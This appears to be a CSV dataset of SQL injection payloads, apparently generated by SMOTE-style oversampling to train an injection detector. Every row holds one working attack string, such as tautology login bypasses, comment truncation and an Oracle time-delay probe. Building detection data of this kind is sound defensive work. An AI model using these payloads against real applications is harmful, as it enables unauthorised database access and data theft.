id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000230,0.36649496605852216
SMOTE_000002,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0
SMOTE_000003,attack,boolean," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",nearest_attack_euclidean,R000095,1.6858739404357614e-07
SMOTE_000004,attack,boolean,"a' or 1  =  1, --",nearest_attack_euclidean,R000234,0.406737429078863
SMOTE_000005,attack,boolean," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",nearest_attack_euclidean,R000129,0.10021385926101725
SMOTE_000006,attack,boolean,admin' or '1'  =  '1'#,nearest_attack_euclidean,R000049,1.079124702748515
SMOTE_000007,attack,boolean, or uid like '%,nearest_attack_euclidean,R000099,0.8835728569525984
SMOTE_000008,attack,boolean," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",nearest_attack_euclidean,R000014,0.2571639725661295
SMOTE_000009,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000005,0.0
SMOTE_000010,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,1.7962960310888305
SMOTE_000011,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0
SMOTE_000012,attack,boolean,"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- loao",nearest_attack_euclidean,R000300,0.34808435403895327
SMOTE_000013,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000307,0.6598514709488887
SMOTE_000014,attack,boolean,admin'  )   or '1'  =  '1'#,nearest_attack_euclidean,R000089,0.19532721392818309
SMOTE_000015,attack,boolean," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000132,0.2506855111443589
SMOTE_000016,attack,boolean,admin'  )   or   (  '1'  =  '1'--,nearest_attack_euclidean,R000156,0.04889886509826311
SMOTE_000017,attack,boolean,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,nearest_attack_euclidean,R000050,0.3151418676768615
SMOTE_000018,attack,boolean,"or 0  =  0 #""",nearest_attack_euclidean,R000037,1.1316921588369635
SMOTE_000019,attack,boolean, or 'x'  =  'x,nearest_attack_euclidean,R000232,0.3061162179511649
SMOTE_000020,attack,boolean,admin'or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000175,0.9531087099050324
SMOTE_000021,attack,boolean," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",nearest_attack_euclidean,R000014,0.31819016425094293
SMOTE_000022,attack,boolean,and 1 in   (  select var from temp  )  --,nearest_attack_euclidean,R000071,2.135977757497366
SMOTE_000023,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0
